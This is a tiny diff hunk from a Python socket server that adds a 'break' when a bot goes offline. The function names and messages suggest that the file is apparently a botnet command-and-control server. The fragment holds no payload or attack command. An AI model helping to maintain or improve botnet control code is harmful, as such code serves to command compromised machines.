@@ -63,6 +63,7 @@ def handle_bot(sock,socketList):
 				print("[!] A bot offline")
 			except:
 				pass
+			break
 
 def waitConnect(sock,addr):
 	passwd = sock.recv(1024).decode()
